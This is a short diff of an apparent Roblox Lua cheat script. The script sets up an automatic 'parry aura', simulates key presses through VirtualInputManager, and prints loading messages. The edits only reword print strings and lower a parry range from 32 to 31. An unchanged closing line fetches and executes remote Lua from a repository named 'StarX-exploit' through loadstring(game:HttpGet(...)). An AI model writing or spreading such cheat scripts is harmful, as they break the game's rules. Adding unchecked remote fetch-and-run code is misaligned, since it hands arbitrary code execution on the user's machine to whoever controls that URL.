@@ -1,4 +1,4 @@
-print("script is load..!")
+print("script is load..!?")
 wait(1)
 print("script is running wait a 1 second 💪😈")
 wait(1)
@@ -95,7 +95,7 @@ end
 local aura_table = {
 	canParry = true,
 	is_Spamming = false,
-	parry_Range = 32,
+	parry_Range = 31,
 	spam_Range = 0,  
 	hit_Count = 0,
 	hit_Time = tick(),
@@ -1482,7 +1482,7 @@ UICorner.Parent = ImageButton
 ImageButton.MouseButton1Click:Connect(function()
     game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.LeftAlt, false, game)
 end)
-print("Loading Succesful! 😹💥")
+print("Loading.. is succesfull. 😹💥")
 
 --Execute Checker  
 loadstring(game:HttpGet("https://raw.githubusercontent.com/StarX-exploit/executed/refs/heads/main/exe.lua"))()
